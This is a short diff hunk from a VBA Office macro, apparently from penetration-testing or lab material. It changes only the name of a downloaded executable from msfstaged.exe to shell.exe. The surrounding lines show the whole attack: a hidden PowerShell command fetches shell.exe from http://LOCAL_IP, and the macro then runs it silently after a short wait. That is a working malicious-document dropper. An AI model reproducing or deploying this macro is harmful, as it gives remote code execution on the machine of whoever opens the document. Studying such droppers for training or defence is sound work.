@@ -178,7 +178,7 @@ Sub MyMacro()
     str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://LOCAL_IP/shell.exe', 'shell.exe')"
     Shell str, vbHide
     Dim exePath As String
-    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
+    exePath = ActiveDocument.Path & "\" & "shell.exe"
     Wait (2)
     Shell exePath, vbHide
 
